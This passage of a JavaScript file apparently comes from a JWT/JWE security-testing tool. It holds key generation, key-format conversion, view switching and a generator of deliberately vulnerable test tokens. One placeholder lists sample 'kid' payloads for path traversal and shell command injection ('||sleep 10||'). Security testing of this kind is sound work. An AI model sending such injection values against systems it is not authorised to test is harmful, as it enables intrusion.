            if (derBytes[offset++] !== 0x30) throw new Error("Expected AlgorithmIdentifier SEQUENCE");
            const { length: algLength, bytesRead: algBytesRead } = readLength(derBytes, offset);
            offset += algBytesRead;

            // Algorithm OID
            if (derBytes[offset++] !== 0x06) throw new Error("Expected Algorithm OID");
            const { length: oidLength, bytesRead: oidBytesRead } = readLength(derBytes, offset);
            offset += oidBytesRead;

            const algorithmOid = oidToString(derBytes, offset, oidLength);
            keyType = OIDs[algorithmOid] || 'unknown';
            offset += oidLength;

            // For EC key, try to extract curve
            if (keyType === 'EC' && offset < derBytes.length && derBytes[offset] === 0x06) {
                offset++; // OID tag
                const { length: curveOidLength, bytesRead: curveOidBytesRead } = readLength(derBytes, offset);
                offset += curveOidBytesRead;

                const curveOid = oidToString(derBytes, offset, curveOidLength);
                namedCurve = OIDs[curveOid] || 'unknown';
            }
        }
    } catch (error) {
        console.warn('ASN.1 parsing error:', error);
    }

    return { keyType, namedCurve };
}

/**
 * Generates a random HMAC key of a specified length (16, 24, 32, 48, 64 bytes)
 *
 * @param {number} length  Length of the key in bytes (16, 24, 32, 48, 64)
 * @throws {Error} Bad key length if the length is not 16, 24, 32, 48, or 64
 * @return {string}  Random HMAC key in hex format
 */
function generateHMACKey(length, returnBase64 = false) {
    if (length !== 32 && length !== 16 && length !== 24 && length !== 64 && length !== 48) {
        console.error(generateHMACKey.name, "Bad key length");
        return
    }
    const randomBytes = new Uint8Array(length);
    window.crypto.getRandomValues(randomBytes);
    const hexKey = Array.from(randomBytes).map(b => b.toString(16).padStart(2, '0')).join('');
    if (returnBase64) return URL_to_base64(Uint8ArrayTobase64Url(randomBytes));
    return hexKey;
}

/**
 * Generates an RSA key pair.
 *
 * @return {Promise<Array>} - [PKCS8 private key, SPKI public key]
 */
async function generateRSAKey() {
    const keypair = await crypto.subtle.generateKey(
        {
            name: "RSASSA-PKCS1-v1_5",
            modulusLength: 2048,
            publicExponent: new Uint8Array([1, 0, 1]),
            hash: { name: "SHA-256" } // RS256 -> SHA-256, RS384 -> SHA-384, RS512 -> SHA-512
        },
        true,
        ["sign", "verify"]
    );
    return [await exportKey(keypair.privateKey, "pkcs8"), await exportKey(keypair.publicKey, "spki")];
}
/**
 * Generates a random content encryption key based on the specified encryption algorithm
 * For CBC algorithms, the key length is doubled to accommodate HMAC.
 * @param {string} encryption_algorithm
 * @param {boolean} [generateBase64=true] - If true, returns the key in Base64 format; otherwise, returns ascii
 * @return {string} Random content encryption key Base64 encoded or ascii
 */
function generateContentEncryptionKey(encryption_algorithm, generateBase64 = true) {
    let length = Number(encryption_algorithm.substring(1, 4)) / 8
    if (["A128CBC-HS256", "A192CBC-HS384", "A256CBC-HS512"].includes(encryption_algorithm)) length *= 2 // Encryption algorithm with HMAC use twice the key length
    if (generateBase64) {
        const randomBytes = new Uint8Array(length);
        return URL_to_base64(Uint8ArrayTobase64Url(window.crypto.getRandomValues(randomBytes)));
    }
    else {
        return randomAsciiString(length);
    }
}

/**
 * Generates a key encryption key based on the specified JWE algorithm.
 * The key length is determined by the algorithm, and the key is generated as a Base64 encoded string.
 *
 *
 * @param {string} algorithm - JWE algorithm (e.g., "A128KW", "A192KW", "A256KW", "RSA-OAEP", "RSA-OAEP-256")
 * @param {boolean} [generateBase64=true] - If true, returns the key in Base64 format; otherwise, returns ascii
 * @return {string} - Random key encryption key in Base64 format or ascii
 */
function generateKeyEncryptionKey(algorithm, generateBase64 = true) {
    const length = _jwe_algorithm_to_key_length[algorithm];
    if (generateBase64) {
        const randomBytes = new Uint8Array(length);
        return URL_to_base64(Uint8ArrayTobase64Url(window.crypto.getRandomValues(randomBytes)));
    }
    else {
        return randomAsciiString(length);
    }
}

/**
 * Generates an RSA key pair using the RSA-OAEP(-256) algorithm.
 *
 * @return {Promise<Array>} - [PKCS8 private key, SPKI public key]
 * @description This function generates a new RSA key pair with a modulus length of 2048 bits and SHA-1/256 hash.
 */
async function generateRSA_OAEP(alg) {
    const keypair = await crypto.subtle.generateKey(
        {
            name: "RSA-OAEP",
            modulusLength: 2048,
            publicExponent: new Uint8Array([1, 0, 1]),
            hash: _alg_converter[alg] // RSA-OAEP -> SHA-1; RSA-OAEP-256 -> SHA-256
        },
        true, // exportierbar
        ["encrypt", "decrypt"]
    );
    return [await exportKey(keypair.privateKey, "pkcs8"), await exportKey(keypair.publicKey, "spki")]
}

/**
 * Generates an RSA key pair using the RSA-PSS algorithm.
 *
 * @return {Promise<Array>} - [PKCS8 private key, SPKI public key]
 * @description This function generates a new RSA key pair with a modulus length of 2048 bits and SHA-256 hash.
 */
async function generatePSKey() {
    const keypair = await window.crypto.subtle.generateKey(
        {
            name: "RSA-PSS",
            modulusLength: 2048,
            publicExponent: new Uint8Array([1, 0, 1]),
            hash: "SHA-256"
        },
        true,
        ["sign", "verify"]
    );
    return [await exportKey(keypair.privateKey, "pkcs8"), await exportKey(keypair.publicKey, "spki")]
}
/**
 * Generates a new EC key pair for the specified curve.
 *
 * @param {string} curve - The curve name (e.g., "P-256", "P-384", "P-521").
 * @return {Promise<Array>} - [PKCS8 private key, SPKI public key]
 */
async function generateECKey(curve) {
    const keyPair = await window.crypto.subtle.generateKey(
        {
            name: "ECDSA",
            namedCurve: curve
        },
        true,
        ["sign", "verify"]
    );
    //const keypair = KEYUTIL.generateKeypair("EC", curve);
    const publicKeyPem = await exportKey(keyPair.publicKey, "spki");
    const privateKeyPem = await exportKey(keyPair.privateKey, "pkcs8");
    return [privateKeyPem, publicKeyPem];
}
/**
 * Export a key to PEM format.
 *
 * @param {string} key
 * @param {string} type - "spki" for public key, "pkcs8" for private key
 * @return {Promise<string>} PEM-formatted key
 */
async function exportKey(key, type) {
    const exported = await window.crypto.subtle.exportKey(type, key);
    const pemHeader = type === "spki" ? "PUBLIC KEY" : "PRIVATE KEY";
    const base64Key = btoa(String.fromCharCode(...new Uint8Array(exported)))
        .match(/.{1,64}/g)
        .join("\n");
    return `-----BEGIN ${pemHeader}-----\n${base64Key}\n-----END ${pemHeader}-----`;
}
/**
 * Converts a JWK to SPKI PEM format with the specified algorithm.
 *
 * @param {object} jwk - JWK object
 * @param {string} jwkAlg - JWK algorithm (e.g., RS256, ES256)
 * @return {Promise<string>} PEM formated public key
 */
async function jwkToSpkiPem(jwk, jwkAlg) {

    let algoName;
    if (jwk.kty === 'RSA') {
        if (jwkAlg.startsWith('PS')) {
            algoName = 'RSA-PSS';
        } else if (jwkAlg.startsWith('RS')) {
            algoName = 'RSASSA-PKCS1-v1_5';
        } else {
            throw new Error(`Not supported RSA-Algorithm: ${jwkAlg}`);
        }
        // exract public key components from JWK
        var jwkKey = {
            kty: 'RSA',
            n: jwk.n,
            e: jwk.e,
            alg: jwkAlg,
            ext: true
        };
        var algorithm_params = { // RSA object differs from EC object
            name: algoName,
            hash: { name: _alg_converter[jwkAlg] }
        }
    }
    else if (jwk.kty === 'EC') {
        // extract public key components from JWK
        var jwkKey = {
            kty: 'EC',
            crv: jwk.crv,
            x: jwk.x,
            y: jwk.y,
            alg: jwkAlg,
            ext: true
        };
        var algorithm_params = { // RSA object differs from EC object
            name: 'ECDSA',
            namedCurve: jwk.crv
        };

    }
    else {
        throw new Error(`Not supported key type: ${jwk.kty}`);
    }

    // Import the JWK key
    const key = await crypto.subtle.importKey(
        'jwk',
        jwkKey,
        algorithm_params,
        true,
        ['verify']
    );

    // export as SPKI
    return await exportKey(key, 'spki');
}
// #endregion ====================== End of Key Generation Functions

// #region ====================== Table and UI Functions

/**
 * Event function if the kek encoding checkbox is changed.
 * This function updates the KEK input field with a new content encryption key based on the selected algorithm and whether the key should be Base64 encoded.
 *
 */
function changeKekEncoding() {
    isBase64 = document.getElementById("isSymmetricKeyJWEBase64").checked;
    const kekInput = document.getElementById("keyJWE");
    const alg = document.getElementById("algorithmJWE").value;
    kekInput.value = generateContentEncryptionKey(alg, isBase64)
}

/**
 * UI function to set the active button for content type (JSON) selection.
 * This function updates the button's appearance and sets the value of the hidden input field.
 * @param {Object} element - Button element that was clicked.
 * @param {string} value - Value of the Button that was clicked ('Valid JSON', 'Invalid JSON', 'Raw Text').
 */
function setActiveContentTypeJSONButton(element, value) {
    document.querySelectorAll('.segment-btn-small').forEach(btn => {
        btn.classList.remove('active');
    });
    element.classList.add('active');
    document.getElementById('contentTypeOfJSON').value = value;
    const beautifyButtons = document.getElementById('beautifyButtons');
    if (value === 'Valid JSON') {
        beautifyButtons.style.display = 'none';
    }
    else if (value === 'Raw Text') {
        beautifyButtons.style.display = 'block';
    }

}
/**
 * Imports the JWT token from the JWT encode/decode view into the Signature Attacks input field
 *
 * @return {void}
 */
function importTokenFromJWTView() {
    const jwtToken = document.getElementById("token").value;
    if (!jwtToken) {
        jwt_attacks_error_message("No token available in JWT View.");
        return;
    }
    document.getElementById("jwt-attacks-input").value = jwtToken;
}

/**
 * Displays error message(s) in the UI (jwt attacks).
 * Scrolls to the error message element.
 *
 *
 * @param {string} errorMessage
 */
function jwt_attacks_error_message(errorMessage) {
    console.error(errorMessage);
    const errorElement = document.getElementById('jwt-attacks-error-message');
    if (errorElement) {
        errorElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }
    if (errorElement.innerText) {
        errorElement.innerText += "\n" + errorMessage;
    } else {
        errorElement.innerText = errorMessage;
    }
}

/**
 * Displays error message(s) in the UI (JWT).
 * Scrolls to the error message element.
 *
 * @param {string} errorMessage
 */
function jwt_error_message(errorMessage) {
    console.error(errorMessage);
    const errorElement = document.getElementById('jwtErrorMessage');
    if (errorElement) {
        errorElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }
    if (errorElement.innerText) {
        errorElement.innerText += "\n" + errorMessage;
    } else {
        errorElement.innerText = errorMessage;
    }
}

/**
 * Displays error message(s) in the UI (JWE).
 * Scrolls to the error message element.
 * @param {string} errorMessage
 */
function jwe_error_message(errorMessage) {
    console.error(errorMessage);
    const errorElement = document.getElementById('jweErrorMessage');
    if (errorElement) {
        errorElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }
    if (errorElement.innerText) {
        errorElement.innerText += "\n" + errorMessage;
    } else {
        errorElement.innerText = errorMessage;
    }
}
/**
 * switch to Key Management view
 */
function toggleToKeyMgmt() {
    if (isKeyMgmtView) return;

    // Update toggle buttons
    document.getElementById('option-KeyMgmt').classList.add('active');
    document.getElementById('option-JWT').classList.remove('active');
    document.getElementById('option-JWE').classList.remove('active');
    document.getElementById('option-Attacks').classList.remove('active');

    // Show/hide containers
    document.getElementById('KeyMgmt-Container').style.display = "block";
    document.getElementById('JWT-Container').style.display = "none";
    document.getElementById('JWE-Container').style.display = "none";
    document.getElementById('Attacks-Container').style.display = "none";

    // Update view flags
    isJWTView = false;
    isJWEView = false;
    isAttacksView = false;
    isKeyMgmtView = true;

    // Load stored keys on view switch
    updateStoredKeysListInKeyGenerationView();
}
/**
 * switch to JWT view (from JWE or Attacks)
 *
 *
 */
function toggleToJWT() {
    if (isJWTView) return;
    document.getElementById('option-JWT').classList.add('active');
    document.getElementById('option-JWE').classList.remove('active');
    document.getElementById('option-Attacks').classList.remove('active');
    document.getElementById('option-KeyMgmt').classList.remove('active');

    document.getElementById('JWT-Container').style.display = "block";
    document.getElementById('JWE-Container').style.display = "none";
    document.getElementById('Attacks-Container').style.display = "none";
    document.getElementById('KeyMgmt-Container').style.display = "none";

    isJWTView = true;
    isJWEView = false;
    isAttacksView = false;
    isKeyMgmtView = false;
    syncTokenSectionHeight('JWT');
}

/**
 * switch to JWE view (from JWT or Attacks)
 *
 */
function toggleToJWE() {
    if (isJWEView) return;
    document.getElementById('option-JWE').classList.add('active');
    document.getElementById('option-JWT').classList.remove('active');
    document.getElementById('option-Attacks').classList.remove('active');
    document.getElementById('option-KeyMgmt').classList.remove('active');

    document.getElementById('JWE-Container').style.display = "block";
    document.getElementById('JWT-Container').style.display = "none";
    document.getElementById('Attacks-Container').style.display = "none";
    document.getElementById('KeyMgmt-Container').style.display = "none";

    isJWTView = false;
    isJWEView = true;
    isAttacksView = false;
    isKeyMgmtView = false;
    syncTokenSectionHeight('JWE');
}

/**
 * switch to Attacks view (from JWT or JWE)
 *
 */
function toggleToAttacks() {
    if (isAttacksView) return;
    document.getElementById('option-JWE').classList.remove('active');
    document.getElementById('option-JWT').classList.remove('active');
    document.getElementById('option-Attacks').classList.add('active');
    document.getElementById('option-KeyMgmt').classList.remove('active');

    document.getElementById('JWE-Container').style.display = "none";
    document.getElementById('JWT-Container').style.display = "none";
    document.getElementById('Attacks-Container').style.display = "block";
    document.getElementById('KeyMgmt-Container').style.display = "none";

    isJWTView = false;
    isJWEView = false;
    isAttacksView = true;
    isKeyMgmtView = false;
}

function changeEncryptionAlgorithmEvent() {
    if (isJWEView) {
        const alg = document.getElementById("encryptionAlgorithmJWE").value;
        console.debug(alg);
        // change alg value in the decoded header
        document.getElementById("decodedHeaderJWE").value = document.getElementById("decodedHeaderJWE").value.replace(/"enc":\s*"[^"]*"/, '"enc": "' + alg + '"')
    }
}
/**
 *  Event handler for changing the algorithm in the JWT or JWE view
 *
 */
function changeAlgorithmEvent() {
    if (isJWTView) {
        const alg = document.getElementById("algorithm").value;
        console.debug(alg);
        // change alg value in the decoded header
        document.getElementById("decodedHeader").value = document.getElementById("decodedHeader").value.replace(/"alg": *".*"/, '"alg": "' + alg + '"')
        if (alg === "None") { // no keys needed
            document.getElementById("symKeys").style.display = "none";
            document.getElementById("asymKeys").style.display = "none";
            document.getElementById("publicKey").value = "";
            document.getElementById("privateKey").value = "";
            document.getElementById("key").value = "";
        }
        else if (alg[0] === 'H') { // only symmetric keys needed
            document.getElementById("symKeys").style.display = "block";
            document.getElementById("asymKeys").style.display = "none";
            document.getElementById("publicKey").value = "";
            document.getElementById("privateKey").value = "";
            document.getElementById("key").value = "";
        }
        else { // asymmetric keys needed
            document.getElementById("symKeys").style.display = "none";
            document.getElementById("asymKeys").style.display = "flex";
            document.getElementById("key").value = "";
            document.getElementById("publicKey").value = "";
            document.getElementById("privateKey").value = "";
        }
    }
    else if (isJWEView) {
        const alg = document.getElementById("algorithmJWE").value;
        console.debug(alg);
        console.debug(alg.startsWith("PBES"))
        // change alg value in the decoded header
        document.getElementById("decodedHeaderJWE").value = document.getElementById("decodedHeaderJWE").value.replace(/"alg": *".*",/, '"alg": "' + alg + '",')
        if (alg.startsWith("A") || alg === "dir") { // symmetric encryption algorithms
            document.getElementById("symKeysJWE").style.display = "block";
            document.getElementById("asymKeysJWE").style.display = "none";
            document.getElementById("pbkdf2-parametersJWE").style.display = "none";
            document.getElementById("publicKeyJWE").value = "";
            document.getElementById("privateKeyJWE").value = "";
            document.getElementById("keyJWE").value = "";
        }
        else if (alg.startsWith("PBES")) {
            console.debug("PBES algorithm selected");
            document.getElementById("symKeysJWE").style.display = "block";
            document.getElementById("asymKeysJWE").style.display = "none";
            document.getElementById("pbkdf2-parametersJWE").style.display = "block";
            document.getElementById("publicKeyJWE").value = "";
            document.getElementById("privateKeyJWE").value = "";
            document.getElementById("keyJWE").value = "";
        }
        else {
            document.getElementById("symKeysJWE").style.display = "none";
            document.getElementById("asymKeysJWE").style.display = "flex";
            document.getElementById("pbkdf2-parametersJWE").style.display = "none";
            document.getElementById("publicKeyJWE").value = "";
            document.getElementById("privateKeyJWE").value = "";
            document.getElementById("keyJWE").value = "";
        }

    }

}

/**
 * Calculates the total token amount based on selected vulnerabilities via checkboxes.
 * The amount is calculated with the token_amount property of the vulnerabilities object.
 * The total amount is displayed in the button text of the generate button.
 *
 */
function calculateTotalTokenAmount() {
    const selectedVulnerabilities = document.querySelectorAll('#vulnerabilities-list input[type="checkbox"]:checked');
    let totalTokens = 0;
    selectedVulnerabilities.forEach(checkbox => {
        const tokens = Number(checkbox.getAttribute('data-token-amount-parent'))
        totalTokens += tokens
    });
    document.getElementById('generate-btn').innerText = "Generate Vulnerable Tokens (" + totalTokens + ")";
}
function updateKidTokenCount(textarea) {
    const checkbox = textarea.previousElementSibling;
    const oldValue = Number(textarea.dataset.lastCount || 0);
    const newValue = parsePayloadContentForKid(textarea.value).length;

    // Speichere den neuen Wert für den nächsten Aufruf
    textarea.dataset.lastCount = newValue;
    checkbox.setAttribute('data-token-amount-child', newValue);

    if (checkbox.checked) {
        // Manuell die Differenz berechnen und das Parent-Token-Amount korrigieren
        const vulnerabilityWrapper = checkbox.closest('.vulnerability-checkbox-wrapper');
        const parentWithTokenAmount = vulnerabilityWrapper.querySelector(".vulnerability-checkbox");
        const parentThatDisplaysTokenAmount = vulnerabilityWrapper.querySelector(".vulnerability-name");

        const currentParentAmount = Number(parentWithTokenAmount.getAttribute('data-token-amount-parent'));
        const correctedAmount = currentParentAmount - oldValue + newValue;

        parentWithTokenAmount.setAttribute('data-token-amount-parent', correctedAmount);

        const currentText = parentThatDisplaysTokenAmount.innerText;
        const newText = currentText.replace(/\(-?\d+\)/, `(${correctedAmount})`);
        parentThatDisplaysTokenAmount.innerText = newText;

        calculateTotalTokenAmount();
    }
}
function change_token_amount_of_parent(test) {
    console.debug("change_token_amount_of_parent", test);

    // Finde die Haupt-Vulnerability-Checkbox über closest()
    const vulnerabilityWrapper = test.closest('.vulnerability-checkbox-wrapper');
    const parentWithTokenAmount = vulnerabilityWrapper.querySelector(".vulnerability-checkbox");
    const parentThatDisplaysTokenAmount = vulnerabilityWrapper.querySelector(".vulnerability-name");

    if (!parentWithTokenAmount || !parentThatDisplaysTokenAmount) {
        console.error("Could not find required elements", {
            parentWithTokenAmount,
            parentThatDisplaysTokenAmount,
            wrapper: vulnerabilityWrapper
        });
        return;
    }

    const token_amount = Number(parentWithTokenAmount.getAttribute('data-token-amount-parent'));
    console.debug("token_amount", token_amount);

    if (test.checked) {
        const newAmount = token_amount + Number(test.getAttribute('data-token-amount-child'));
        parentWithTokenAmount.setAttribute('data-token-amount-parent', newAmount);
    } else {
        const newAmount = token_amount - Number(test.getAttribute('data-token-amount-child'));
        parentWithTokenAmount.setAttribute('data-token-amount-parent', newAmount);
    }

    // Update der Anzeige
    const currentText = parentThatDisplaysTokenAmount.innerText;
    const newText = currentText.replace(/\(\d+\)/, `(${parentWithTokenAmount.getAttribute('data-token-amount-parent')})`);
    parentThatDisplaysTokenAmount.innerText = newText;

    console.debug("Updated display text:", newText);
    calculateTotalTokenAmount();
}
/**
 * Dynamically initializes the vulnerabilities list (checkboxes) in the HTML.
 * It creates checkboxes for each vulnerability in the vulnerabilities object and appends them to the vulnerabilities-list element.
 * It also adds an event listener to the select-all checkbox to check/uncheck all vulnerabilities.
 * There is a special case for KeyConfusion, CustomKey and SSRF vulnerabilities where input fields are added.
 * This function is called on page load to populate the vulnerabilities list.
 *
 */
function initVulnerabilitiesList() {
    //? Should this be in the final version? Since one could also hardcode the checkboxes in the HTML
    //? Its quite handy to add new vulnerabilities, but are there so much more?
    //? Stuff like extra input fields are quite messy

    const vulnerabilitiesList = document.getElementById('vulnerabilities-list');
    vulnerabilitiesList.innerHTML = '';

    Object.keys(vulnerabilities).forEach(key => {
        // Create checkbox with label and description for each vulnerability
        // Extra input fields for certain vulnerabilities needed to be added manually
        const vuln = vulnerabilities[key];
        const checkbox = document.createElement('div');
        checkbox.className = 'vulnerability-checkbox-wrapper';
        checkbox.innerHTML = `
            <input class="vulnerability-checkbox" data-token-amount-parent="${vuln.token_amount}" type="checkbox" id="vuln-${key}" name="vuln-${key}" data-vuln="${key}" onchange="calculateTotalTokenAmount();">
            <div>
                <div>
                    <span  class="vulnerability-name">${vuln.name} (${vuln.token_amount})</span>
                    </div>
                <div class="vulnerability-details">${vuln.description}</div>
                <div class="vulnerability-cve"> <span>${vuln.cve !== 'N/A' ? `${vuln.cve}` : ''}</span></div>
                ${key === 'KeyConfusion' ? '<input type="text" id="KeyConfusionKey" placeholder="Enter Key (JWK or PEM)" />' : ''}
                ${key === 'CustomKey' ? '<input type="text" id="CustomKey" placeholder="Enter Private Key (JWK)" />' : ''}
                ${key === 'CustomKey' ? '<select id="customKeyAlg"><option value="HS256">HS256</option><option value="RS256">RS256</option><option value="ES256">ES256</option><option value="PS256">PS256</option></select>' : ''}
                ${key === 'CustomKey' ? '<div class="inline-checkbox"><input type="checkbox" class="inline-checkbox" onchange="change_token_amount_of_parent(this)" id="testAllCustomKeyAlgs" data-token-amount-child="3"/><label for="testAllCustomKeyAlgs">Test all algorithms? (+3) </label></div>' : ''}
                ${key === 'CustomKey' ? '<div class="inline-checkbox"><input type="checkbox" onchange="change_token_amount_of_parent(this)" id="testCustomKeyViaURL" data-token-amount-child="4"/><input type="text" id="CustomKeyURL" placeholder="jku/x5u URL for JWK" /></div>' : ''}
                ${key === 'SSRF' ? '<input type="text" id="SSRFURL" placeholder="http://localhost:8080" />' : ''}
                ${key === 'Kid' ? '<div class="inline-checkbox"><input type="checkbox" onchange="change_token_amount_of_parent(this)" class="inline-checkbox" data-token-amount-child="0" id="useKidCustomPayloadList"/><textarea id="kidCustomPayloadList" rows="4" onchange="updateKidTokenCount(this)" placeholder="kid_payload;[expected_key(Base64)]&#10;foo;bar&#10;../../../dev/null;\\0&#10;||sleep 10||"></textarea></div>' : ''}
                </div>
                <br>
            `;
        vulnerabilitiesList.appendChild(checkbox);
    });
    // Add Event Listener for Select All Checkbox
    document.getElementById('select-all-checkbox').addEventListener('change', function () {
        const isChecked = this.checked;
        document.querySelectorAll('#vulnerabilities-list input[type="checkbox"]').forEach(checkbox => {
            // Nur wenn sich der Wert ändert
            if (checkbox.checked !== isChecked) {
                checkbox.checked = isChecked;
                // Nur für Child-Checkboxen die Logik ausführen
                if (checkbox.hasAttribute("data-token-amount-child")) {
                    change_token_amount_of_parent(checkbox);
                }
            }
        });
        calculateTotalTokenAmount();
    });
    document.getElementById('select-all-without-user-interaction-checkbox').addEventListener('change', function () {
        const isChecked = this.checked;
        const idsToSkip = ["useKidCustomPayloadList", "vuln-KeyConfusion", "testCustomKeyViaURL", "vuln-SSRF"];
        document.getElementById('select-all-checkbox').checked = false;
        document.querySelectorAll('#vulnerabilities-list input[type="checkbox"]').forEach(checkbox => {
            if (idsToSkip.includes(checkbox.id)) {
                checkbox.checked = false;
            }
            // Nur wenn sich der Wert ändert
            else if (checkbox.checked !== isChecked) {
                checkbox.checked = isChecked;
                // Nur für Child-Checkboxen die Logik ausführen
                if (checkbox.hasAttribute("data-token-amount-child")) {
                    change_token_amount_of_parent(checkbox);
                }
            }
        });
        calculateTotalTokenAmount();
    });
}
/**
 * Helper function to shorten text to a specified length
 *
 * @param {string} text
 * @param {number} [maxLength=50]
 * @return {string}
 */
function shorten(text, maxLength = 50) {

    return text.length > maxLength ? text.slice(0, maxLength) + '…' : text;
}
/**
 * Filter table rows based on input value
 *
 * @param {number} colIndex
 */
function filterTable(colIndex) {
    // colIndex 0: ID, 1: Token, 2: Description, 3: Variant Name, 4: Vulnerability.name
    const input = document.querySelectorAll('thead input')[colIndex].value.toLowerCase();
    const rows = document.querySelectorAll('#resultTable tbody tr');

    rows.forEach(row => {
        if (colIndex === 1) { // Filter for Token; since the shortened version is shown, we need to check the full token
            row.style.display = row.children[colIndex].children[0].dataset.full.toLowerCase().includes(input) ? '' : 'none';
        }
        else {
            row.style.display = row.children[colIndex].textContent.toLowerCase().includes(input) ? '' : 'none';
        }

    });
}

/**
 * Proxy function to handle the click event for generating vulnerable tokens since it is async
 *
 */
async function handleGenerateVulnerableTokens() {
    const testCases = await generateVulnerableTokens();
    renderTestCasesToTable(testCases);
}

/**
 * Toggles the content of a token in the results table between short and full text
 * Currently not used
 * @param {string} id - ID of the token element - token-123
 */
function toggleContent_TableElements(id) {
    const el = document.getElementById(id);
    const isCollapsed = el.dataset.collapsed === 'true';
    el.textContent = isCollapsed ? el.dataset.full : el.dataset.short;
    el.dataset.collapsed = (!isCollapsed).toString();
}

/**
 * Copies the token from the table to the clipboard and changes the text to "✓ Copied!" for 1.2 seconds
 * Currently only used by the token elements in the results table as an onclick event
 *
 * @param {string} id ID of the token element - token-123
 */
function copyTokenFromTableToClipboard(id) {
    const value = document.getElementById(id).dataset.full
    navigator.clipboard.writeText(value).then(() => {
        const el = document.getElementById(id);
        const original = el.textContent;

        el.textContent = "✓ Copied!";
        el.style.color = "green";

        setTimeout(() => {
            el.textContent = document.getElementById(id).dataset.short;
            el.style.color = "#007bff"; // Original color
        }, 1200);
    }).catch(err => {
        console.error("Copy Error:", err);
    });
}
/**
 * Copies the token from the table to the JWT view and decodes it
 *
 * @param {string} id - ID of the token element - token-123
 * @return {void}
 */
function copyTokenFromTableToJWTView(id) {
    const token = document.getElementById(id).dataset.full;

    toggleToJWT();
    document.getElementById("token").value = token;
    decodeToken();
    document.getElementById('decodedHeader').scrollIntoView({ behavior: 'smooth', block: 'center' });

}
/**
 * Renders the test cases to a table in the HTML.
 * This function takes an array of test cases and populates the table with the relevant data.
 * It creates a new row for each test case and fills in the columns with the test ID, token, description, variant name, and vulnerability name.
 * It also adds an onclick event to the token column to copy the token to the clipboard when clicked.
 * The function uses the shorten function to limit the length of the token displayed in the table.
 *
 * @param {array.TestCase} testCases array of test cases to be rendered
 * @param {string} [containerId='resultTableBody'] ID of the table body element to append the rows to
 */
function renderTestCasesToTable(testCases, containerId = 'resultTableBody') {
    const tbody = document.getElementById(containerId);
    tbody.innerHTML = ''; // empty the table body before adding new rows

    testCases.forEach((test) => {
        const shortToken = shorten(test.testToken); //shorten the token for better readability
        const row = document.createElement('tr');
        // create row with testID, token, description, variant name and vulnerability name
        row.innerHTML = `
            <td>
                ${String(test.testId).padStart(testCases.length.toString().length, '0')}

            </td>
            <td>
                <div class="action-buttons">
                    <button onclick="copyTokenFromTableToClipboard('token-${test.testId}')"
                            title="copy to clipboard" class="action-btn">
                        <span>📋</span>
                    </button>
                </div>
            </td>
            <td>
                <div class="action-buttons">
                    <button onclick="copyTokenFromTableToJWTView('token-${test.testId}')"
                            title="open in JWT view" class="action-btn">
                        <span>🔍</span>
                    </button>
                </div>
            </td>

            <td>
                <div class="token-actions">
                    <span
                        id="token-${test.testId}"
                        data-full="${test.testToken}"
                        data-short="${shortToken}"
                        data-collapsed="true"
                    >
                        ${shortToken}
                    </span>

                </div>
            </td>
            <td>${test.description}</td>
            <td>${test.variantName}</td>
            <td>${test.vulnerability.name}</td>
        `;
        tbody.appendChild(row);
    });
}
// #endregion ====================== End of Table and UI Functions

// #region ====================== Key Generation View Functions
/**
 * Sets the conversion direction for key conversion
 */
function setConversionDirectionInKeyGenerationView(element, direction) {
    document.querySelectorAll('.segment-btn-small').forEach(btn => {
        btn.classList.remove('active');
    });
    element.classList.add('active');
    document.getElementById('conversionDirection').value = direction;

    const pemSection = document.getElementById('pemToJwkSection');
    const jwkSection = document.getElementById('jwkToPemSection');

    if (direction === 'pem-to-jwk') {
        pemSection.style.display = 'block';
        jwkSection.style.display = 'none';
    } else {
        pemSection.style.display = 'none';
        jwkSection.style.display = 'block';
    }

    // Clear outputs
    document.getElementById('conversionOutput').value = '';
    document.getElementById('conversionError').innerText = '';
}

/**
 * Updates key generation options based on selected algorithm
 */
function updateKeyGenOptionsInKeyGenerationView() {
    const algorithm = document.getElementById('keyAlgorithm').value;
    const rsaOptions = document.getElementById('rsaOptions');
    const hmacOptions = document.getElementById('hmacOptions');
    const aesOptions = document.getElementById('aesOptions');

    // Hide all options first
    rsaOptions.style.display = 'none';
    hmacOptions.style.display = 'none';
    aesOptions.style.display = 'none';

    if (algorithm.startsWith('RS') || algorithm.startsWith('PS') || algorithm.startsWith('RSA-OAEP')) {
        rsaOptions.style.display = 'block';
    } else if (algorithm.startsWith('HS')) {
        hmacOptions.style.display = 'block';
    } else if (algorithm.startsWith('A')) {
        aesOptions.style.display = 'block';
    }
}
/**
 * Generates a key based on the selected algorithm.
 * Used for the Key Generation UI.
 */
async function generateKeyInKeyGenerationUI() {
    const algorithm = document.getElementById('keyAlgorithm').value;
    const symResult = document.getElementById('symmetricKeyResult');
    const asymResult = document.getElementById('asymmetricKeyResult');

    // clear all
    document.getElementById('generatedSymKey').value = '';
    document.getElementById('generatedPrivateKey').value = '';
    document.getElementById('generatedPublicKey').value = '';
    document.getElementById('generatedPrivateJWK').value = '';
    document.getElementById('generatedPublicJWK').value = '';

    try {
        if (algorithm.startsWith('HS')) {
            // Generate HMAC key
            const length = parseInt(document.getElementById('hmacKeyLength').value);
            const asHex = document.getElementById('hmacAsHex').checked;
            const key = generateHMACKey(length, !(document.getElementById('hmacAsHex').checked));

            document.getElementById('generatedSymKey').value = key;
            symResult.style.display = 'block';
            asymResult.style.display = 'none';

        } else if (algorithm.startsWith('A')) {
            // Generate AES key
            const keyLength = _jwe_algorithm_to_key_length[algorithm];
            const asBase64 = document.getElementById('aesAsBase64').checked;
            const key = generateKeyEncryptionKey(algorithm, asBase64);

            document.getElementById('generatedSymKey').value = key;
            symResult.style.display = 'block';
            asymResult.style.display = 'none';

        } else {
            // Generate asymmetric key pair
            let keyPair;

            if (algorithm.startsWith('RS') || algorithm.startsWith('PS')) {
                const keySize = parseInt(document.getElementById('rsaKeySize').value);
                if (algorithm.startsWith('PS')) {
                    keyPair = await generatePSKey();
                } else {
                    keyPair = await generateRSAKey();
                }
            } else if (algorithm.startsWith('ES')) {
                const curve = _alg_converter[algorithm][1];
                keyPair = await generateECKey(curve);
            } else if (algorithm.startsWith('RSA-OAEP')) {
                keyPair = await generateRSA_OAEP(algorithm);
            }

            if (keyPair) {
                document.getElementById('generatedPrivateKey').value = keyPair[0];
                document.getElementById('generatedPublicKey').value = keyPair[1];

                // Convert to JWK
                const privateJWK = await pemToJwk(keyPair[0], algorithm);
                const publicJWK = await pemToJwk(keyPair[1], algorithm);

                document.getElementById('generatedPrivateJWK').value = JSON.stringify(privateJWK, null, 2);
